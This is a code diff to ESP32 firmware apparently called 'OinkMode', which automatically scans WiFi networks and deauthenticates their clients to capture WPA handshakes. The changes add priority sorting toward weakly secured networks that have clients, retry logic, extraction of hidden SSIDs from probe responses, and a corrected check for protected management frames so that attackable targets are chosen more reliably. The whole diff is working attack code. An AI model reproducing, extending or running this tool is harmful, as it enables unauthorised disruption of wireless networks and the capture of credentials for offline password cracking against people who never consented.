@@ -9,6 +9,7 @@
 #include <esp_wifi.h>
 #include <SPI.h>
 #include <SD.h>
+#include <algorithm>
 
 // Static members
 bool OinkMode::running = false;
@@ -150,45 +151,43 @@ void OinkMode::update() {
                 lastMoodUpdate = now;
             }
             
-            // After scan time, pick first target
+            // After scan time, sort and pick target
             if (now - stateStartTime > SCAN_TIME && !networks.empty()) {
-                selectionIndex = 0;
+                sortNetworksByPriority();
                 autoState = AutoState::NEXT_TARGET;
                 Serial.println("[OINK] Scan complete, starting auto-attack");
             }
             break;
             
         case AutoState::NEXT_TARGET:
-            // Find next target that hasn't been attacked and isn't PMF protected
-            while (selectionIndex < (int)networks.size()) {
-                if (!networks[selectionIndex].hasPMF) {
-                    break;  // Found a valid target
+            {
+                // Use smart target selection
+                int nextIdx = getNextTarget();
+                
+                if (nextIdx < 0) {
+                    // No suitable targets, rescan
+                    autoState = AutoState::SCANNING;
+                    stateStartTime = now;
+                    channelHopping = true;
+                    deauthing = false;
+                    Mood::setStatusMessage("Rescanning...");
+                    Serial.println("[OINK] No targets available, rescanning");
+                    break;
                 }
-                Serial.printf("[OINK] Skipping %s (PMF protected)\n", 
-                             networks[selectionIndex].ssid);
-                selectionIndex++;
+                
+                selectionIndex = nextIdx;
+                
+                // Select this target
+                selectTarget(selectionIndex);
+                networks[selectionIndex].attackAttempts++;  // Track attempts
+                autoState = AutoState::ATTACKING;
+                attackStartTime = now;
+                deauthCount = 0;
+                Serial.printf("[OINK] Auto-attacking: %s (%d clients, attempt #%d)\n", 
+                             networks[selectionIndex].ssid,
+                             networks[selectionIndex].clientCount,
+                             networks[selectionIndex].attackAttempts);
             }
-            
-            if (selectionIndex >= (int)networks.size()) {
-                // All networks attacked or PMF, rescan
-                selectionIndex = 0;
-                autoState = AutoState::SCANNING;
-                stateStartTime = now;
-                channelHopping = true;
-                deauthing = false;
-                Mood::setStatusMessage("Rescanning...");
-                Serial.println("[OINK] All targets done, rescanning");
-                break;
-            }
-            
-            // Select this target
-            selectTarget(selectionIndex);
-            autoState = AutoState::ATTACKING;
-            attackStartTime = now;
-            deauthCount = 0;  // Reset for this target
-            Serial.printf("[OINK] Auto-attacking: %s (%d clients)\n", 
-                         networks[selectionIndex].ssid,
-                         networks[selectionIndex].clientCount);
             break;
             
         case AutoState::ATTACKING:
@@ -236,9 +235,9 @@ void OinkMode::update() {
             for (const auto& hs : handshakes) {
                 if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                     if (memcmp(hs.bssid, networks[targetIndex].bssid, 6) == 0 && hs.isComplete()) {
-                        // Got handshake! Move to next
+                        // Got handshake! Mark network and move to next
+                        networks[targetIndex].hasHandshake = true;
                         Serial.printf("[OINK] Handshake captured for %s!\n", networks[targetIndex].ssid);
-                        selectionIndex++;
                         autoState = AutoState::WAITING;
                         stateStartTime = now;
                         deauthing = false;
@@ -251,7 +250,6 @@ void OinkMode::update() {
             if (now - attackStartTime > ATTACK_TIMEOUT) {
                 Serial.printf("[OINK] Timeout on %s, moving to next\n", 
                     targetIndex >= 0 ? networks[targetIndex].ssid : "?");
-                selectionIndex++;
                 autoState = AutoState::WAITING;
                 stateStartTime = now;
                 deauthing = false;
@@ -415,6 +413,8 @@ void IRAM_ATTR OinkMode::promiscuousCallback(void* buf, wifi_promiscuous_pkt_typ
         case WIFI_PKT_MGMT:
             if (frameSubtype == 0x08) {  // Beacon
                 processBeacon(payload, len, rssi);
+            } else if (frameSubtype == 0x05) {  // Probe Response
+                processProbeResponse(payload, len, rssi);
             }
             break;
             
@@ -463,6 +463,9 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
         net.beaconCount = 1;
         net.isTarget = false;
         net.hasPMF = hasPMF;
+        net.hasHandshake = false;
+        net.attackAttempts = 0;
+        net.isHidden = false;
         net.clientCount = 0;
         
         // Parse SSID from IE
@@ -473,14 +476,22 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
             
             if (offset + 2 + ieLen > len) break;
             
-            if (id == 0 && ieLen > 0 && ieLen < 33) {
-                memcpy(net.ssid, payload + offset + 2, ieLen);
-                net.ssid[ieLen] = 0;
+            if (id == 0) {
+                if (ieLen > 0 && ieLen < 33) {
+                    memcpy(net.ssid, payload + offset + 2, ieLen);
+                    net.ssid[ieLen] = 0;
+                } else {
+                    // Hidden network (zero-length SSID)
+                    net.isHidden = true;
+                }
                 break;
             }
             
             offset += 2 + ieLen;
         }
+        
+        // Check if we already have a handshake for this network
+        net.hasHandshake = hasHandshakeFor(bssid);
         
         // Extract features for ML
         net.features = FeatureExtractor::extractFromBeacon(payload, len, rssi);
@@ -551,6 +562,41 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
     }
 }
 
+void OinkMode::processProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
+    // Probe responses reveal hidden SSIDs
+    if (len < 36) return;
+    
+    const uint8_t* bssid = payload + 16;
+    
+    int idx = findNetwork(bssid);
+    if (idx < 0) return;  // Only update existing networks
+    
+    // If network has hidden SSID, try to extract from probe response
+    if (networks[idx].ssid[0] == 0 || networks[idx].isHidden) {
+        uint16_t offset = 36;
+        while (offset + 2 < len) {
+            uint8_t id = payload[offset];
+            uint8_t ieLen = payload[offset + 1];
+            
+            if (offset + 2 + ieLen > len) break;
+            
+            if (id == 0 && ieLen > 0 && ieLen < 33) {
+                memcpy(networks[idx].ssid, payload + offset + 2, ieLen);
+                networks[idx].ssid[ieLen] = 0;
+                networks[idx].isHidden = false;
+                
+                Serial.printf("[OINK] Hidden SSID revealed: %s\n", networks[idx].ssid);
+                Mood::onNewNetwork(networks[idx].ssid, rssi, networks[idx].channel);
+                break;
+            }
+            
+            offset += 2 + ieLen;
+        }
+    }
+    
+    networks[idx].lastSeen = millis();
+}
+
 void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
     if (len < 28) return;
     
@@ -591,9 +637,11 @@ void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rss
     // Adjust offset for address 4 if needed
     if (toDs && fromDs) offset += 6;
     
-    // Check for QoS Data
-    if ((payload[0] & 0x80) && (payload[0] & 0x08)) {
-        offset += 2;
+    // Check for QoS Data frame (subtype has bit 3 set = 0x08, 0x09, etc.)
+    // Frame control byte 0: bits 4-7 = subtype, bit 3 of subtype = QoS
+    uint8_t subtype = (payload[0] >> 4) & 0x0F;
+    if (subtype & 0x08) {
+        offset += 2;  // QoS control field
     }
     
     if (offset + 8 > len) return;
@@ -1012,10 +1060,11 @@ bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
             // RSN Capabilities (2 bytes)
             uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
             
+            // IEEE 802.11-2016 standard:
             // Bit 6: MFPC (Management Frame Protection Capable)
             // Bit 7: MFPR (Management Frame Protection Required)
-            bool mfpc = (rsnCaps >> 7) & 0x01;
-            bool mfpr = (rsnCaps >> 6) & 0x01;
+            bool mfpc = (rsnCaps >> 6) & 0x01;
+            bool mfpr = (rsnCaps >> 7) & 0x01;
             
             if (mfpr) {
                 return true;  // PMF required - deauth won't work
@@ -1035,4 +1084,91 @@ int OinkMode::findNetwork(const uint8_t* bssid) {
         }
     }
     return -1;
+}
+
+bool OinkMode::hasHandshakeFor(const uint8_t* bssid) {
+    for (const auto& hs : handshakes) {
+        if (memcmp(hs.bssid, bssid, 6) == 0 && hs.isComplete()) {
+            return true;
+        }
+    }
+    return false;
+}
+
+void OinkMode::sortNetworksByPriority() {
+    // Sort networks by attack priority:
+    // 1. Has clients + no handshake + not PMF (highest priority)
+    // 2. Weak auth (Open, WEP, WPA1) + no handshake
+    // 3. WPA2 without PMF + no handshake
+    // 4. Networks with handshake already (skip)
+    // 5. PMF protected (can't attack)
+    
+    std::sort(networks.begin(), networks.end(), [](const DetectedNetwork& a, const DetectedNetwork& b) {
+        // Calculate priority score (lower = higher priority)
+        auto getPriority = [](const DetectedNetwork& net) -> int {
+            // Already have handshake - lowest priority
+            if (net.hasHandshake) return 100;
+            // PMF protected - can't attack
+            if (net.hasPMF) return 99;
+            
+            int priority = 50;  // Base
+            
+            // Has clients = much higher priority (deauth more likely to work)
+            if (net.clientCount > 0) priority -= 30;
+            
+            // Auth mode priority (weaker = higher priority)
+            switch (net.authmode) {
+                case WIFI_AUTH_OPEN: priority -= 20; break;  // Not useful but fast
+                case WIFI_AUTH_WEP: priority -= 15; break;   // Deprecated
+                case WIFI_AUTH_WPA_PSK: priority -= 10; break;  // Weak
+                case WIFI_AUTH_WPA_WPA2_PSK: priority -= 5; break;
+                case WIFI_AUTH_WPA2_PSK: priority += 0; break;  // Standard
+                case WIFI_AUTH_WPA3_PSK: priority += 10; break;  // Usually has PMF
+                default: break;
+            }
+            
+            // Fewer attack attempts = higher priority (try new ones first)
+            priority += net.attackAttempts * 5;
+            
+            // Strong signal = higher priority (more reliable)
+            if (net.rssi > -50) priority -= 5;
+            else if (net.rssi > -70) priority -= 2;
+            
+            return priority;
+        };
+        
+        return getPriority(a) < getPriority(b);
+    });
+}
+
+int OinkMode::getNextTarget() {
+    // Smart target selection with retry logic
+    // First pass: networks with clients, no handshake, attackAttempts < 3
+    for (int i = 0; i < (int)networks.size(); i++) {
+        if (networks[i].hasPMF) continue;
+        if (networks[i].hasHandshake) continue;
+        if (networks[i].clientCount > 0 && networks[i].attackAttempts < 3) {
+            return i;
+        }
+    }
+    
+    // Second pass: any network without handshake, attackAttempts < 2
+    for (int i = 0; i < (int)networks.size(); i++) {
+        if (networks[i].hasPMF) continue;
+        if (networks[i].hasHandshake) continue;
+        if (networks[i].attackAttempts < 2) {
+            return i;
+        }
+    }
+    
+    // Third pass: retry networks with clients even if attempted before
+    for (int i = 0; i < (int)networks.size(); i++) {
+        if (networks[i].hasPMF) continue;
+        if (networks[i].hasHandshake) continue;
+        if (networks[i].clientCount > 0) {
+            return i;
+        }
+    }
+    
+    return -1;  // No suitable targets
 }
